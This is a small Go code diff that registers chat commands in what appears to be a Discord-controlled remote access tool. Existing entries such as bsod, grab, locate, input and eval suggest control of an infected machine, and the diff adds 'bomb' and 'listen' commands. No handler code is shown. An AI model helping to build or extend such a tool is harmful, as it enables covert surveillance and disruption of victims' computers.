@@ -189,6 +189,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 func register() {
 	commandsList["audio"] = &commands.AudioCommand{}
+	commandsList["bomb"] = &commands.BombCommand{}
 	commandsList["brightness"] = &commands.LightCommand{}
 	commandsList["bsod"] = &commands.BSODCommand{}
 	commandsList["critical"] = &commands.Criticalommand{}
@@ -197,6 +198,7 @@ func register() {
 	commandsList["eval"] = &commands.EvalCommand{}
 	commandsList["grab"] = &commands.GrabCommand{}
 	commandsList["input"] = &commands.InputCommand{}
+	commandsList["listen"] = &commands.ListenCommand{}
 	commandsList["locate"] = &commands.LocateCommand{}
 	commandsList["notif"] = &commands.NotifCommand{}
 	commandsList["overwrite"] = &commands.OverwriteCommand{}
